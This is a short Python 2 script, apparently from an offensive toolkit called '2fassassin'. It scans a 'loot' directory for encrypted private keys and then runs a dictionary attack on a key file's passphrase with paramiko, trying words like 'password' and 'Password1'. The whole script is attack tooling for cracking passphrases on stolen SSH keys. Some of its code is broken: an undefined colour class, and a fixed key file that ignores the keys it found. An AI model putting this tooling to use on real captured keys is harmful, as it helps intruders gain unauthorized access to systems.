#!/usr/bin/env python


import paramiko
from paramiko import rsakey
import sys, os
import glob
import shutil

#testkey = "/root/2fassassin/loot/*.txt"

for file in glob.glob('/root/2fassassin/loot/*'):
    print 'AUDIT: file=>{0}<'.format(file)
    with open(file) as f:
        contents = f.read()
    if 'AES' in contents:
        print "\n [FOUND] ENCRYPTED PRIVATE KEY ----------------------------------------------------------------------------------------->  " +file
        print "\n"
        #return file
        # copy the encrypted private keys to ../crack/rsa
        #b = "../crack/rsa/"
        #shutil.copy2(file,b)



def cracker():
    kf = open('testkey', "r")
    dlist = ["foo", "bar", "foobar", "klunssi", "xyzzy", "testing", "root", "freebie", "crackmore", "crackme", "longword", "super", "almost", "there", "hit", "jackpot", "password", "Password1", "more", "crazy", "ridiculous"]
    for d in dlist:
        kf.seek(0)
        try:
            nk = rsakey.RSAKey.from_private_key(kf, password=d)
            print "[+] **************** SUCCESS *************** - ", d
        except paramiko.ssh_exception.SSHException:
            print "not this password -", d


def main():
    try:
        #searchfile()
        print "\n ################################### Attemtp to crack testkey ################################## \n"
        cracker()
    except KeyboardInterrupt:
        print bcolors.RED+"\nCaught Ctrl-C, GraceFul Exit. POOOF"+bcolors.ENDC


if __name__ == '__main__':
    try:
        main()
    except:
        print "ERROR: something is wrong.\n"
        sys.exit()
